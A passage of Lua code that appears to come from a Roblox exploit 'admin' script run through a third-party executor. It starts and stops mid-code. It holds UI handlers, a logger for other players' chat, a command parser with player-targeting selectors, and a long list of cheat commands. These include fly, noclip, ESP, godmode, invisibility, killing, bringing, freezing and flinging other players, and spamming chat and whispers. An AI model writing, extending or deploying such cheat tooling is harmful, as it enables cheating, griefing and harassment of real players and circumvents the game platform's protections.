		Holder.Settings:TweenPosition(UDim2.new(0, 0, 0, 220), "InOut", "Quart", 0.5, true, nil)
	end
end)

Holder.Settings.StayOpen.Button.On.MouseButton1Click:Connect(function()
	if StayOpen == false then StayOpen = true
		Holder.Settings.StayOpen.Button.On.BackgroundTransparency = 0
	else StayOpen = false
		Holder.Settings.StayOpen.Button.On.BackgroundTransparency = 1
	end
	updatesaves()
end)

Clear.MouseButton1Down:connect(function()
	for _, child in pairs(scroll:GetChildren()) do
		child:Destroy()
	end
	scroll.CanvasSize = UDim2.new(0, 0, 0, 10)
end)

Toggle.MouseButton1Down:connect(function()
	if logsEnabled then
		logsEnabled = false
		Toggle.Text = 'Disabled'
		updatesaves()
	else
		logsEnabled = true
		Toggle.Text = 'Enabled'
		updatesaves()
	end
end)

if not writefileExploit() then
	notify('Saves','Your exploit does not support read/write file. Your settings will not save.')
end

ChatLog = function(plr)
	plr.Chatted:Connect(function(Message)
		if logsEnabled == true then
			CreateLabel(plr.Name,Message)
		end
	end)
end

for _, plr in pairs(Players:GetChildren()) do
	if plr.ClassName == "Player" then
		ChatLog(plr)
	end
end

Players.PlayerAdded:connect(function(player)
	ChatLog(player)
	if ESPenabled then
		ESP(player)
	end
	if CHMSenabled then
		CHMS(player)
	end
end)

Players.PlayerRemoving:connect(function(player)
	for i,v in pairs(PARENT:GetChildren()) do
		if v.Name == player.Name..'_ESP' or v.Name == player.Name..'_LC' then
			v:Destroy()
		end
	end
end)

shadow.Exit.MouseButton1Down:connect(function()
	logsDrag:TweenPosition(UDim2.new(0, 0, 1, 10), "InOut", "Quart", 0.3, true, nil)
end)

shadow.Hide.MouseButton1Down:connect(function()
	if logsDrag.Position ~= UDim2.new(0, 0, 1, -20) then
		logsDrag:TweenPosition(UDim2.new(0, 0, 1, -20), "InOut", "Quart", 0.3, true, nil)
	else
		logsDrag:TweenPosition(UDim2.new(0, 0, 1, -250), "InOut", "Quart", 0.3, true, nil)
	end
end)

Holder.Settings.Color.Select.MouseButton1Click:Connect(function()
	notify('UI Color','Not done yet :(')
end)

Holder.Settings.Keybinds.Select.MouseButton1Click:Connect(function()
	KeybindsFrame:TweenPosition(UDim2.new(0, 0, 0, 0), "InOut", "Quart", 0.5, true, nil)
	wait(0.5)
	disablebuttons()
end)

KeybindsFrame.Close.MouseButton1Click:Connect(function()
	enablebuttons()
	KeybindsFrame:TweenPosition(UDim2.new(0, 0, 0, 175), "InOut", "Quart", 0.5, true, nil)
end)

Holder.Settings.Keybinds.Select.MouseButton1Click:Connect(function()
	KeybindsFrame:TweenPosition(UDim2.new(0, 0, 0, 0), "InOut", "Quart", 0.5, true, nil)
	wait(0.5)
	disablebuttons()
end)

KeybindsFrame.Add.MouseButton1Click:Connect(function()
	KeybindEditor:TweenPosition(UDim2.new(0.5, -180, 0, 270), "InOut", "Quart", 0.5, true, nil)
end)

KeybindsFrame.Delete.MouseButton1Click:Connect(function()
	binds = {}
	refreshbinds()
	updatesaves()
	notify('Keybinds Updated','Removed all keybinds')
end)

AliasesFrame.Close.MouseButton1Click:Connect(function()
	enablebuttons()
	AliasesFrame:TweenPosition(UDim2.new(0, 0, 0, 175), "InOut", "Quart", 0.5, true, nil)
end)

Settings.Aliases.Select.MouseButton1Click:Connect(function()
	AliasesFrame:TweenPosition(UDim2.new(0, 0, 0, 0), "InOut", "Quart", 0.5, true, nil)
	wait(0.5)
	disablebuttons()
end)

PositionsFrame.Close.MouseButton1Click:Connect(function()
	enablebuttons()
	PositionsFrame:TweenPosition(UDim2.new(0, 0, 0, 175), "InOut", "Quart", 0.5, true, nil)
end)

Settings.Positions.Select.MouseButton1Click:Connect(function()
	PositionsFrame:TweenPosition(UDim2.new(0, 0, 0, 0), "InOut", "Quart", 0.5, true, nil)
	wait(0.5)
	disablebuttons()
end)

local cmds={}
local customAlias = {}
AliasesFrame.Delete.MouseButton1Click:Connect(function()
	customAlias = {}
	aliases = {}
	notify('Aliases Modified','Removed all aliases')
	updatesaves()
	refreshaliases()
end)

Holder.Settings.Prefix.PrefixBox.Changed:connect(function(property)
	if property == "Text" then
		prefix = Holder.Settings.Prefix.PrefixBox.Text
		updatesaves()
	end
end)

function dragGUI(gui)
spawn(function()
local dragging
local dragInput
local dragStart
local startPos
local function update(input)
    local delta = input.Position - dragStart
	gui:TweenPosition(UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y), "InOut", "Quart", 0.04, true, nil) 
end
gui.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = gui.Position
        
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)
gui.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        update(input)
    end
end)
end)
end

dragGUI(logsDrag)
dragGUI(KeybindEditor)
dragGUI(PluginEditor)

local CSP = Holder
local frame = CSP:WaitForChild('CMDs')

Match = function(name,str)
	return name:lower():find(str:lower()) and true
end

canvasPos = nil
canvasTop = false
IndexContents = function(str,bool,cmdbar,anim)
	if str == '' or str == ' ' or str == prefix then
		if canvasTop == false then
			canvasPos = CMDsF.CanvasPosition.Y
		end
	else
		CMDsF.CanvasPosition = Vector2.new(0,0)
		canvasTop = true
	end
	local Index,SizeY = 0,0
	local indexnum = 0
	for i,v in next, frame:GetChildren() do
		if bool then
			if Match(v.Text,str) then
				indexnum = indexnum + 1
				Index = Index + 1
				v.Position = UDim2.new(0,10,0,Index*v.AbsoluteSize.Y-v.AbsoluteSize.Y)
				v.Visible = true
				SizeY = SizeY + v.AbsoluteSize.Y
				frame.CanvasSize = UDim2.new(0,0,0,SizeY)
			else
				v.Visible = false
			end
		else
			v.Visible = true
			SizeY = SizeY + v.AbsoluteSize.Y
			frame.CanvasSize = UDim2.new(0,0,0,SizeY)
		end
	end
	if not anim then
		if indexnum == 0 or string.find(str, " ") then
			if not cmdbar then
				minimizeHolder()
			elseif cmdbar then
				cmdbarHolder()
			end
		else
			maximizeHolder()
		end
	else
		minimizeHolder()
	end
end

PlayerGui = Players.LocalPlayer:FindFirstChildOfClass("PlayerGui")
function chatSuggestions()
	if PlayerGui:FindFirstChild("Chat") and PlayerGui.Chat:FindFirstChild("Frame") and PlayerGui.Chat.Frame:FindFirstChild("ChatBarParentFrame") and
		PlayerGui.Chat.Frame.ChatBarParentFrame:FindFirstChild("Frame") and PlayerGui.Chat.Frame.ChatBarParentFrame.Frame:FindFirstChild("BoxFrame") then
		local chatbox = PlayerGui.Chat.Frame.ChatBarParentFrame.Frame.BoxFrame.Frame.ChatBar
		
		chatbox.Changed:connect(function(property)
			if property == "Text" then
				if chatbox.Text:lower():sub(1,1) == prefix then
					if SettingsOpen == true then
						wait(0.2)
						Holder.Settings:TweenPosition(UDim2.new(0, 0, 0, 220), "InOut", "Quart", 0.2, true, nil)
					end
					IndexContents(PlayerGui.Chat.Frame.ChatBarParentFrame.Frame.BoxFrame.Frame.ChatBar.Text:lower():sub(2),true) 
				else
					minimizeHolder()
					if SettingsOpen == true then
						Settings:TweenPosition(UDim2.new(0, 0, 0, 45), "InOut", "Quart", 0.2, true, nil)
					end
				end
			end
		end)

		chatbox.FocusLost:connect(function(enterpressed)
			if not enterpressed or chatbox.Text:lower():sub(1,1) ~= prefix then
				IndexContents('',true)
				if canvasPos ~= nil then
					CMDsF.CanvasPosition = Vector2.new(0, canvasPos)
					canvasTop = false
				end
			end
			minimizeHolder()
		end)
		
		PlayerGui.Chat.Frame.ChatBarParentFrame.ChildAdded:Connect(function(newbar)
			wait()
			if newbar:FindFirstChild('BoxFrame') then
				chatSuggestions()
			end
		end)
		
	else
		notify('Suggestions','Custom chat detected. Will not provide suggestions for commands typed in the chat.')
	end
end

chatSuggestions()

local CMDs = {}
CMDs[#CMDs + 1] = {NAME = 'rejoin / rj', DESC = 'Makes you rejoin the game'}
CMDs[#CMDs + 1] = {NAME = 'exit', DESC = 'Kills roblox process'}
CMDs[#CMDs + 1] = {NAME = 'chatlogs / logs', DESC = 'Log what people say or whisper'}
CMDs[#CMDs + 1] = {NAME = 'serverinfo / info', DESC = 'Gives you info about the server'}
CMDs[#CMDs + 1] = {NAME = 'explorer / dex', DESC = 'Opens DEX explorer'}
CMDs[#CMDs + 1] = {NAME = 'remotespy', DESC = 'Prints remotes (updating soon)'}
CMDs[#CMDs + 1] = {NAME = 'breakloops / break (cmd loops)', DESC = 'Stops any cmd loops (;100^1^cmd)'}
CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
CMDs[#CMDs + 1] = {NAME = 'addalias [cmd] [alias]', DESC = 'Adds an alias to a command'}
CMDs[#CMDs + 1] = {NAME = 'removealias [alias]', DESC = 'Removes a custom alias'}
CMDs[#CMDs + 1] = {NAME = 'clraliases', DESC = 'Removes all custom aliases'}
CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
CMDs[#CMDs + 1] = {NAME = 'noclip', DESC = 'Go through objects'}
CMDs[#CMDs + 1] = {NAME = 'unnoclip / clip', DESC = 'Disables noclip'}
CMDs[#CMDs + 1] = {NAME = 'fly', DESC = 'Makes you fly'}
CMDs[#CMDs + 1] = {NAME = 'unfly', DESC = 'Disables fly'}
CMDs[#CMDs + 1] = {NAME = 'flyspeed [num]', DESC = 'Set fly speed'}
CMDs[#CMDs + 1] = {NAME = 'float', DESC = 'Makes you float'}
CMDs[#CMDs + 1] = {NAME = 'unfloat', DESC = 'Disables floating'}
CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
CMDs[#CMDs + 1] = {NAME = 'spos / setwaypoint [name]', DESC = 'Sets a waypoint at your position'}
CMDs[#CMDs + 1] = {NAME = 'dpos / deletewaypoint [name]', DESC = 'Deletes a waypoint'}
CMDs[#CMDs + 1] = {NAME = 'lpos / waypoint [name]', DESC = 'Teleports player to a waypoint'}
CMDs[#CMDs + 1] = {NAME = 'clearpos / cpos / clearwaypoints', DESC = 'Clears all waypoints'}
CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
CMDs[#CMDs + 1] = {NAME = 'spam [text]', DESC = 'Makes you spam the chat'}
CMDs[#CMDs + 1] = {NAME = 'unspam', DESC = 'Turns off spam'}
CMDs[#CMDs + 1] = {NAME = 'pmspam [plr] [text]', DESC = 'Makes you spam a players whispers'}
CMDs[#CMDs + 1] = {NAME = 'unpmspam [plr]', DESC = 'Turns off pm spam'}
CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
CMDs[#CMDs + 1] = {NAME = 'esp', DESC = 'View all players and their status'}
CMDs[#CMDs + 1] = {NAME = 'noesp / unesp', DESC = 'Removes esp'}
CMDs[#CMDs + 1] = {NAME = 'chams', DESC = 'ESP but without text in the way'}
CMDs[#CMDs + 1] = {NAME = 'nochams / unchams', DESC = 'Removes chams'}
CMDs[#CMDs + 1] = {NAME = 'locate [plr]', DESC = 'View a single player and their status'}
CMDs[#CMDs + 1] = {NAME = 'unlocate / nolocate [plr]', DESC = 'Removes locate'}
CMDs[#CMDs + 1] = {NAME = 'spectate / view [plr]', DESC = 'View a player'}
CMDs[#CMDs + 1] = {NAME = 'unspectate / unview', DESC = 'Stops viewing player'}
CMDs[#CMDs + 1] = {NAME = 'freecam / fc', DESC = 'Allows you to freely move camera around the game'}
CMDs[#CMDs + 1] = {NAME = 'unfreecam / unfc', DESC = 'Disables freecam'}
CMDs[#CMDs + 1] = {NAME = 'freecamspeed / fcspeed [num]', DESC = 'Adjusts freecam speed'}
CMDs[#CMDs + 1] = {NAME = 'firstp', DESC = 'Forces camera to go into first person'}
CMDs[#CMDs + 1] = {NAME = 'thirdp', DESC = 'Allows camera to go into third person'}
CMDs[#CMDs + 1] = {NAME = 'maxzoom [num]', DESC = 'Maximum camera zoom'}
CMDs[#CMDs + 1] = {NAME = 'fixcam', DESC = 'Fixes camera'}
CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
CMDs[#CMDs + 1] = {NAME = 'btools (CLIENT)', DESC = 'Gives you building tools (DOES NOT REPLICATE)'}
CMDs[#CMDs + 1] = {NAME = 'f3x (CLIENT)', DESC = 'Loads f3x tools'}
CMDs[#CMDs + 1] = {NAME = 'delete [part name] (CLIENT)', DESC = 'Removes any part with a certain name from the workspace (DOES NOT REPLICATE)'}
CMDs[#CMDs + 1] = {NAME = 'deleteclass / dc [class name] (CLIENT)', DESC = 'Removes any part with a certain classname from the workspace (DOES NOT REPLICATE)'}
CMDs[#CMDs + 1] = {NAME = 'lockworkspace / lockws', DESC = 'Locks the whole workspace'}
CMDs[#CMDs + 1] = {NAME = 'unlockworkspace / unlockws', DESC = 'Unlocks the whole workspace'}
CMDs[#CMDs + 1] = {NAME = 'gotopart [part name]', DESC = 'Moves your character to a part or multiple parts'}
CMDs[#CMDs + 1] = {NAME = 'bringpart [part name] (CLIENT)', DESC = 'Moves a part or multiple parts to your character'}
CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
CMDs[#CMDs + 1] = {NAME = 'ambient [num] [num] [num] (CLIENT)', DESC = 'Changes ambient'}
CMDs[#CMDs + 1] = {NAME = 'nofog (CLIENT)', DESC = 'Removes fog'}
CMDs[#CMDs + 1] = {NAME = 'brightness [num] (CLIENT)', DESC = 'Changes the brightness lighting property'}
CMDs[#CMDs + 1] = {NAME = 'restorelighting / rlighting', DESC = 'Restores Lighting properties'}
CMDs[#CMDs + 1] = {NAME = 'light [radius] (CLIENT)', DESC = 'Gives your player dynamic light'}
CMDs[#CMDs + 1] = {NAME = 'nolight / unlight', DESC = 'Removes dynamic light from your player'}
CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
CMDs[#CMDs + 1] = {NAME = 'age [plr]', DESC = 'Tells you the age of a player'}
CMDs[#CMDs + 1] = {NAME = 'os [plr]', DESC = "Shows a player's platform"}
CMDs[#CMDs + 1] = {NAME = 'bang [plr]', DESC = 'owo'}
CMDs[#CMDs + 1] = {NAME = 'unbang [plr]', DESC = 'uwu'}
CMDs[#CMDs + 1] = {NAME = 'headsit [plr]', DESC = 'Sit on a players head'}
CMDs[#CMDs + 1] = {NAME = 'kill [plr] (TOOL)', DESC = 'Kills a player (YOU NEED A TOOL)'}
CMDs[#CMDs + 1] = {NAME = 'bring [plr] (TOOL)', DESC = 'Brings a player (YOU NEED A TOOL)'}
CMDs[#CMDs + 1] = {NAME = 'fling', DESC = 'Flings anyone you touch'}
CMDs[#CMDs + 1] = {NAME = 'unfling', DESC = 'Disables the fling command'}
CMDs[#CMDs + 1] = {NAME = 'loopoof', DESC = 'Loops everyones character sounds (everyone can hear)'}
CMDs[#CMDs + 1] = {NAME = 'unloopoof', DESC = 'Stops the oof chaos'}
CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
CMDs[#CMDs + 1] = {NAME = 'respawn', DESC = 'Respawns you'}
CMDs[#CMDs + 1] = {NAME = 'refresh / re', DESC = 'Respawns and brings you back to the same position'}
CMDs[#CMDs + 1] = {NAME = 'god', DESC = 'Gives you godmode'}
CMDs[#CMDs + 1] = {NAME = 'ungod', DESC = 'Respawns/ungods you'}
CMDs[#CMDs + 1] = {NAME = 'invisible / invis', DESC = 'Makes you invisible to other players'}
CMDs[#CMDs + 1] = {NAME = 'weaken', DESC = 'Changes CustomPhysicalProperties in your player'}
CMDs[#CMDs + 1] = {NAME = 'unweaken', DESC = 'Changes CustomPhysicalProperties in your player'}
CMDs[#CMDs + 1] = {NAME = 'strengthen', DESC = 'Changes CustomPhysicalProperties in your player'}
CMDs[#CMDs + 1] = {NAME = 'unstrengthen', DESC = 'Changes CustomPhysicalProperties in your player'}
CMDs[#CMDs + 1] = {NAME = 'speed / ws [num]', DESC = 'Change your walkspeed'}
CMDs[#CMDs + 1] = {NAME = 'hipheight / hheight [num]', DESC = 'Adjusts hip height'}
CMDs[#CMDs + 1] = {NAME = 'jumppower / jpower [num]', DESC = 'Change a players jump height'}
CMDs[#CMDs + 1] = {NAME = 'gravity / grav [num]', DESC = 'Change your gravity'}
CMDs[#CMDs + 1] = {NAME = 'sit', DESC = 'Makes your character sit'}
CMDs[#CMDs + 1] = {NAME = 'stun', DESC = 'Enables PlatformStand'}
CMDs[#CMDs + 1] = {NAME = 'unstun', DESC = 'Disables PlatformStand'}
CMDs[#CMDs + 1] = {NAME = 'team [team name] (CLIENT)', DESC = 'Changes your team. Sometimes fools localscripts.'}
CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
CMDs[#CMDs + 1] = {NAME = 'goto [plr]', DESC = 'Go to a player'}
CMDs[#CMDs + 1] = {NAME = 'loopgoto [plr]', DESC = 'Loop teleport to a player'}
CMDs[#CMDs + 1] = {NAME = 'unloopgoto [plr]', DESC = 'Stops teleporting you to a player'}
CMDs[#CMDs + 1] = {NAME = 'loopbring [plr] (CLIENT)', DESC = 'Loop brings a player to you (useful for killing)'}
CMDs[#CMDs + 1] = {NAME = 'unloopbring [plr]', DESC = 'Undoes loopbring'}
CMDs[#CMDs + 1] = {NAME = 'freeze / fr [plr] (CLIENT)', DESC = 'Freezes a player'}
CMDs[#CMDs + 1] = {NAME = 'thaw / unfr [plr]', DESC = 'Unfreezes a player'}
CMDs[#CMDs + 1] = {NAME = 'tpposition / tppos [coordinate]', DESC = 'Teleports you to a coordinate'}
CMDs[#CMDs + 1] = {NAME = 'offset [coordinate]', DESC = 'Offsets you by a coordinate'}
CMDs[#CMDs + 1] = {NAME = 'getposition / getpos', DESC = 'Notifies you the coordinates of your character'}
CMDs[#CMDs + 1] = {NAME = 'spawnpoint / spawn', DESC = 'Sets a position where you will spawn'}
CMDs[#CMDs + 1] = {NAME = 'nospawnpoint / nospawn', DESC = 'Removes your custom spawn point'}
CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
CMDs[#CMDs + 1] = {NAME = 'animation / anim [ID] [speed]', DESC = 'Makes your character preform an animation (must be by roblox to replicate)'}
CMDs[#CMDs + 1] = {NAME = 'dance', DESC = 'Makes you  d a n c e'}
CMDs[#CMDs + 1] = {NAME = 'spasm', DESC = 'Makes you  c r a z y'}
CMDs[#CMDs + 1] = {NAME = 'unspasm', DESC = 'Stops spasm'}
CMDs[#CMDs + 1] = {NAME = 'headthrow', DESC = 'Simply makes you throw your head'}
CMDs[#CMDs + 1] = {NAME = 'noarms', DESC = 'Removes your arms'}
CMDs[#CMDs + 1] = {NAME = 'nolegs', DESC = 'Removes your arms'}
CMDs[#CMDs + 1] = {NAME = 'nolimbs', DESC = 'Removes your limbs'}
CMDs[#CMDs + 1] = {NAME = 'naked', DESC = 'Removes your clothing'}
CMDs[#CMDs + 1] = {NAME = 'blockhead', DESC = 'Turns your head into a block'}
CMDs[#CMDs + 1] = {NAME = 'blockhats', DESC = 'Turns your hats into blocks'}
CMDs[#CMDs + 1] = {NAME = 'clone', DESC = 'Creates an illusion of a clone'}
CMDs[#CMDs + 1] = {NAME = 'creeper', DESC = 'Makes you look like a creeper'}
CMDs[#CMDs + 1] = {NAME = 'drophats', DESC = 'Drops your hats'}
CMDs[#CMDs + 1] = {NAME = 'droptools', DESC = 'Drops your tools'}
CMDs[#CMDs + 1] = {NAME = 'spin [speed]', DESC = 'Spins your character'}
CMDs[#CMDs + 1] = {NAME = 'unspin', DESC = 'Disables spin'}
CMDs[#CMDs + 1] = {NAME = 'spinhats', DESC = 'Spins your characters accessorys'}
CMDs[#CMDs + 1] = {NAME = 'unspinhats', DESC = 'Undoes spinhats'}
CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
CMDs[#CMDs + 1] = {NAME = 'tools', DESC = 'Copies tools from ReplicatedStorage and Lighting'}
CMDs[#CMDs + 1] = {NAME = 'keeptools / ktools', DESC = 'Saves tools to startergear'}
CMDs[#CMDs + 1] = {NAME = 'nokeeptools / noktools', DESC = 'Deletes tools in startergear'}
CMDs[#CMDs + 1] = {NAME = 'notools/removetools', DESC = 'Removes tools from character and backpack'}
CMDs[#CMDs + 1] = {NAME = 'grabtools', DESC = 'Automatically get tools that are dropped'}
CMDs[#CMDs + 1] = {NAME = 'ungrabtools', DESC = 'Disables grabtools'}
CMDs[#CMDs + 1] = {NAME = 'givetools [plr]', DESC = 'Give your tools to a player'}
CMDs[#CMDs + 1] = {NAME = 'copytools [plr]', DESC = 'Copies a players tools'}
wait()

for i = 1, #CMDs do
	local newcmd = Holder.Example:Clone()
	newcmd.Parent = Holder.CMDs
	newcmd.Visible = false
	newcmd.Text = "" .. CMDs[i].NAME
	newcmd.Name = 'CMD'
	newcmd.MouseButton1Click:Connect(function()
		notify(CMDs[i].NAME,CMDs[i].DESC)
	end)
end

IndexContents('',true)

function FindInTable(Table, Name)
	for i,v in pairs(Table) do
		if v == Name then
			return true
		end
	end
	return false
end


function GetInTable(Table, Name)
	for i = 1, #Table do
		if Table[i] == Name then
			return i
		end
	end
	return false
end

function respawn(plr)
	if r15(plr) then
		plr.Character.Humanoid.Health = 0
		wait(0.1)
		plr.Character.Head.CFrame = CFrame.new(1000000,0,1000000)
		plr.Character.HumanoidRootPart:Destroy()
	else		
		plr.Character:Destroy()
		local M = Instance.new('Model', workspace) M.Name = 'respawn_iy'
		local H = Instance.new('Humanoid', M)
		local T = Instance.new('Part', M) T.Name = 'Torso' T.CanCollide = false T.Transparency = 1
		plr.Character = M
	end
end

function refresh(plr)
	spawn(function()
		local rpos = plr.Character.HumanoidRootPart.Position
		wait()
		respawn(plr)
		wait()
		repeat wait() until plr.Character ~= nil and plr.Character:FindFirstChild('HumanoidRootPart')
		plr.Character:MoveTo(rpos)
	end)
end

godded = false
local oldCframe
local currentTool

Players.LocalPlayer.CharacterAdded:Connect(function()
	wait(0.3)
	if spawnpoint and not godded and spawnpos ~= nil then
		Players.LocalPlayer.Character.HumanoidRootPart.CFrame = spawnpos
	end
	bangplr = nil
	execCmd('clip')
	if godded then
		repeat wait() until Players.LocalPlayer.Character ~= nil and Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart') and Players.LocalPlayer.Character:FindFirstChild('Humanoid')
		Players.LocalPlayer.Character.Humanoid:SetStateEnabled(15,false)
		Players.LocalPlayer.Character.Humanoid:SetStateEnabled(16,false)
		local r=Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
		for i = 1,5 do
			r.CFrame = oldCframe
		end
		if currentTool ~= nil then
			local nt = Players.LocalPlayer.Backpack:FindFirstChild(currentTool.Name)
			nt.Parent = Players.LocalPlayer.Character
			currentTool = nil
		end
	end
end)

Players.LocalPlayer.CharacterRemoving:Connect(function()
    if Players.LocalPlayer.Character then
        local r = Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        if r ~= nil then oldCframe = r.CFrame end
		currentTool = Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")
    end
end)

local std={}
std.inTable=function(tbl,val)
    if tbl==nil then return false end
    for _,v in pairs(tbl)do
        if v==val then return true end
    end 
	return false
end

function getstring(begin)
	local start = begin-1
	local AA = '' for i,v in pairs(cargs) do
		if i > start then
			if AA ~= '' then
				AA = AA .. ' ' .. v
			else
				AA = AA .. v
			end
		end
	end
	return AA
end

local findCmd=function(cmd_name)
	for i,v in pairs(cmds)do
		if v.NAME:lower()==cmd_name:lower() or std.inTable(v.ALIAS,cmd_name:lower()) then
			return v
		end
	end
	return customAlias[cmd_name:lower()]
end

local function splitString(str,delim)
	local broken = {}
	if delim == nil then delim = "," end
		for w in string.gmatch(str,"[^"..delim.."]+") do
			table.insert(broken,w)
		end
	return broken
end

local historyCount = 0
local cmdHistory = {}
local split=" "
lastBreakTime = 0
function execCmd(cmdStr,speaker)
	spawn(function()
		if canvasPos ~= nil then
			CMDsF.CanvasPosition = Vector2.new(0, canvasPos)
			canvasTop = false
		end
		local rawCmdStr = cmdStr
		cmdStr = string.gsub(cmdStr,"\\\\","%%BackSlash%%")
		local commandsToRun = splitString(cmdStr,"\\")
		for i,v in pairs(commandsToRun) do
			v = string.gsub(v,"%%BackSlash%%","\\")
			local x,y,num = v:find("^(%d+)%^")
			local cmdDelay = 0
			if num then
				v = v:sub(y+1)
				local x,y,del = v:find("^([%d%.]+)%^")
				if del then
					v = v:sub(y+1)
					cmdDelay = tonumber(del) or 0
				end
			end
		num = tonumber(num or 1)
		local args = splitString(v,split)
		local cmd = findCmd(args[1])
		if cmd then
			table.remove(args,1)
			cargs = args
			if speaker == Players.LocalPlayer then
				if cmdHistory[1] ~= rawCmdStr then table.insert(cmdHistory,1,rawCmdStr) end
			end
			if #cmdHistory > 20 then table.remove(cmdHistory) end
			local cmdStartTime = tick()
			for rep = 1,num do
				if lastBreakTime > cmdStartTime then break end
					pcall(function()
						cmd.FUNC(args, speaker)
					end)
					if cmdDelay ~= 0 then wait(cmdDelay) end
				end
			end
		end
	end)	
end	

function addcmd(name,alias,func,plgn)
	cmds[#cmds+1]=
	{
		NAME=name;
		ALIAS=alias;
		FUNC=func;
		PLUGIN=plgn;
	}
end

function addbind(cmd,key)
	binds[#binds+1]=
	{
		COMMAND=cmd;
		KEY=key;
	}
end

function addcmdtext(text,name,desc)
	local newcmd = Holder.Example:Clone()
	newcmd.Parent = Holder.CMDs
	newcmd.Visible = false
	newcmd.Text = text
	newcmd.Name = 'PLUGIN_'..name
	if desc then
		newcmd.MouseButton1Click:Connect(function()
			notify(text,desc)
		end)
	end
end

local SpecialPlayerCases = {
	["all"] = function(speaker)return Players:GetPlayers() end,
	["others"] = function(speaker)
		local plrs = {}
		for i,v in pairs(Players:GetPlayers()) do
			if v ~= speaker then
				table.insert(plrs,v)
			end
		end
		return plrs
	 end,
	["me"] = function(speaker)return {speaker} end,
	["#(%d+)"] = function(speaker,args,currentList)
		local returns = {}
		local randAmount = tonumber(args[1])
		local players = {unpack(currentList)}
		for i = 1,randAmount do
			if #players == 0 then break end
			local randIndex = math.random(1,#players)
			table.insert(returns,players[randIndex])
			table.remove(players,randIndex)
		end
		return returns
	end,
	["random"] = function(speaker,args,currentList)
		local players = currentList
		return {players[math.random(1,#players)]}
	end,
	["%%(.+)"] = function(speaker,args)
		local returns = {}
		local team = args[1]
		for _,plr in pairs(Players:GetPlayers()) do
			if plr.Team and string.sub(string.lower(plr.Team.Name),1,#team) == string.lower(team) then
				table.insert(returns,plr)
			end
		end
		return returns
	end,
	["allies"] = function(speaker)
		local returns = {}
		local team = speaker.Team
		for _,plr in pairs(Players:GetPlayers()) do
			if plr.Team == team then
				table.insert(returns,plr)
			end
		end
		return returns
	end,
	["enemies"] = function(speaker)
		local returns = {}
		local team = speaker.Team
		for _,plr in pairs(Players:GetPlayers()) do
			if plr.Team ~= team then
				table.insert(returns,plr)
			end
		end
		return returns
	end,
	["team"] = function(speaker)
		local returns = {}
		local team = speaker.Team
		for _,plr in pairs(Players:GetPlayers()) do
			if plr.Team == team then
				table.insert(returns,plr)
			end
		end
		return returns
	end,
	["nonteam"] = function(speaker)
		local returns = {}
		local team = speaker.Team
		for _,plr in pairs(Players:GetPlayers()) do
			if plr.Team ~= team then
				table.insert(returns,plr)
			end
		end
		return returns
	end,
	["friends"] = function(speaker,args)
		local returns = {}
		for _,plr in pairs(Players:GetPlayers()) do
			if plr:IsFriendsWith(speaker.UserId) and plr ~= speaker then
				table.insert(returns,plr)
			end
		end
		return returns
	end,
	["nonfriends"] = function(speaker,args)
		local returns = {}
		for _,plr in pairs(Players:GetPlayers()) do
			if not plr:IsFriendsWith(speaker.UserId) and plr ~= speaker then
				table.insert(returns,plr)
			end
		end
		return returns
	end,
	["guests"] = function(speaker,args)
		local returns = {}
		for _,plr in pairs(Players:GetPlayers()) do
			if plr.Guest then
				table.insert(returns,plr)
			end
		end
		return returns
	end,
	["bacons"] = function(speaker,args)
		local returns = {}
		for _,plr in pairs(Players:GetPlayers()) do
			if plr.Character:FindFirstChild('Pal Hair') or plr.Character:FindFirstChild('Kate Hair') then
				table.insert(returns,plr)
			end
		end
		return returns
	end,
	["age(%d+)"] = function(speaker,args)
		local returns = {}
		local age = tonumber(args[1])
		if not age == nil then return end
		for _,plr in pairs(Players:GetPlayers()) do
		if plr.AccountAge <= age then
				table.insert(returns,plr)
			end
		end
		return returns
	end,
	["rad(%d+)"] = function(speaker,args)
		local returns = {}
		local radius = tonumber(args[1])
		local speakerChar = speaker.Character
		if not speakerChar or not speakerChar:FindFirstChild("HumanoidRootPart") then return end
		for _,plr in pairs(Players:GetPlayers()) do
			if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
				local magnitude = (plr.Character:FindFirstChild("HumanoidRootPart").Position-speakerChar.HumanoidRootPart.Position).magnitude
				if magnitude <= radius then table.insert(returns,plr) end
			end
		end
		return returns
	end
}

local function toTokens(str)
	local tokens = {}
	for op,name in string.gmatch(str,"([+-])([^+-]+)") do
		table.insert(tokens,{Operator = op,Name = name})
	end
	return tokens
end

local function onlyIncludeInTable(tab,matches)
	local matchTable = {}
	local resultTable = {}
	for i,v in pairs(matches) do matchTable[v.Name] = true end
	for i,v in pairs(tab) do if matchTable[v.Name] then table.insert(resultTable,v) end end
	return resultTable
end

local function removeTableMatches(tab,matches)
	local matchTable = {}
	local resultTable = {}
	for i,v in pairs(matches) do matchTable[v.Name] = true end
	for i,v in pairs(tab) do if not matchTable[v.Name] then table.insert(resultTable,v) end end
	return resultTable
end

local function getPlayersByName(name)
	local found = {}
	for i,v in pairs(Players:GetChildren()) do
		if string.sub(string.lower(v.Name),1,#name) == string.lower(name) then
			table.insert(found,v)
		end
	end
	return found
end

function getPlayer(list,speaker)
	if list == nil then return {speaker.Name} end
	local nameList = splitString(list,",")
	
